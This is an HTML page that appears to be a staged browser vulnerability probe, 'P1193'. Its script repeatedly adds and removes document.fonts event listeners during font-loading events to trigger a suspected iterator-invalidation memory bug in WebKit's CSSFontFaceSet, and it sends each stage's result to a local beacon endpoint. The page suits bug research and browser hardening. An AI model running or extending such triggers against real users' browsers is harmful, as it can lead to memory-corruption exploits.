<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1193 FontEventClient Set Mutation</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1193 — FONTEVENTCLIENT SET MUTATION (exact-source audited)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1193-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1193: CSSFontFaceSet::fontStateChanged -> decrementActiveCount ->
   completedLoading() iterates m_fontEventClients WHILE the JS
   'loadingdone' event fires. add/removeEventListener on document.fonts
   mutates that set mid-forEach (HashSet iterator invalidation class).
   Stages:
   0: feature detect (fonts events)
   1: 'loadingdone' listener adds a new listener inside the event
   2: 'loadingdone' listener removes another listener inside the event
   3: churn 20 add/remove inside one 'loadingdone'
   4: 'loading' event same churn
   5: 50 face load cycles with churn listeners
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['detect','addInEvent','removeInEvent','churn20','loadingEvent','cycles50'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1193_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1193_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/5 — '+STAGES[stage]);

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1193_stage');}catch(e){}
}else{
try{localStorage.setItem('p1193_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function done(rep){
  results.push({stage:stage,name:cur,result:rep});
  try{localStorage.setItem('p1193_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,700));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');setTimeout(function(){location.reload(true);},700);
}
function dummy(){}

if(cur==='detect'){
  var hasFonts=(document.fonts&&document.fonts.addEventListener);
  done('fontsEvents='+hasFonts);
}else{
  var mode=cur;
  var fired=0,rep='';
  function cycle(onDone){
    var ff=new FontFace('ev'+Date.now()%1000,'local(Courier)');
    document.fonts.add(ff);
    void ff.loaded;
    var timeout=setTimeout(function(){onDone('timeout');},4000);
    document.fonts.addEventListener('loadingdone',function h1(){
      fired++;
      try{
        if(mode==='addInEvent'){
          document.fonts.addEventListener('loading',dummy);
        }else if(mode==='removeInEvent'){
          document.fonts.removeEventListener('loading',dummy);
        }else if(mode==='churn20'){
          for(var i=0;i<20;i++){
            document.fonts.addEventListener('loading',dummy);
            document.fonts.removeEventListener('loading',dummy);
          }
        }else if(mode==='loadingEvent'){
          document.fonts.addEventListener('loading',dummy);
        }
      }catch(e){B('EV-ERR',String(e.message).slice(0,40));}
      document.fonts.removeEventListener('loadingdone',h1);
      clearTimeout(timeout);
      onDone('fired='+fired);
    });
  }
  if(mode==='cycles50'){
    var n=0,err='';
    function one(){
      if(n>=50){done('SURVIVED-50|fired='+fired);return;}
      n++;
      var ff=new FontFace('cy'+n,'local(Courier)');
      document.fonts.add(ff);
      void ff.loaded;
      var h2=function(){
        try{
          document.fonts.addEventListener('loading',dummy);
          document.fonts.removeEventListener('loading',dummy);
        }catch(e){err=String(e.message).slice(0,40);}
        document.fonts.removeEventListener('loadingdone',h2);
        setTimeout(one,60);
      };
      document.fonts.addEventListener('loadingdone',h2);
      setTimeout(function(){document.fonts.removeEventListener('loadingdone',h2);setTimeout(one,60);},2000);
    }
    one();
    setTimeout(function(){done('timeout-check|n='+n+'|err='+(err||'none'));},15000);
  }else{
    cycle(function(r){done(r);});
  }
}
} /* stage machine */

(function(){
  var cur='P1193-fontclients';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
